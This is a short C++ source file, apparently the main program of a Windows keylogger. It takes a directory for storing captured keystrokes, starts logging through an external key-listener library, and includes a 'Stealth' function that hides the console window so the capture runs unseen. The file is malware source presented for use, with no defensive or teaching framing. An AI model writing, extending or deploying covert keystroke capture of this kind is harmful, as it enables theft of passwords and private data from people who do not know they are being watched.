#define _WIN32_WINNT 0x0500
#include <iostream>

#include "key_listener_exports.h"

using namespace std;

#define KEYLOGGER_DIR_INDEX (1)

void Stealth()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
}

int main(int argc, const char *argv[]) {
    KLOGGER_error_codes_t rc = UNDEFINED;
    string path;

    if (argc < 2) {
        cout << "Usage: " << argv[0] << " ==DIR_TO_STORE_FILE==" << endl;
        rc = ERROR_BAD_ARGS;
        goto Exit;
    }
    path = argv[KEYLOGGER_DIR_INDEX];

    cout << "Init files at: " << path << endl;

    rc = KLOGGER_init_klogger(path);
    if (SUCCESS != rc) {
        cout << "Init Failed with error code: " << rc << endl;
        goto Exit;
    }
    cout << "Init Successfully" << endl;

    /*
     * Hide console window.
     */
    Stealth();

    rc = KLOGGER_begin_logging();
    if (SUCCESS != rc) {
        cout << "Finish Failed with error code: " << rc << endl;
        goto Exit;
    }
    cout << "Finished Successfully" << endl;

Exit:
    cout << "Exit code: " << rc << endl;
    return rc;
}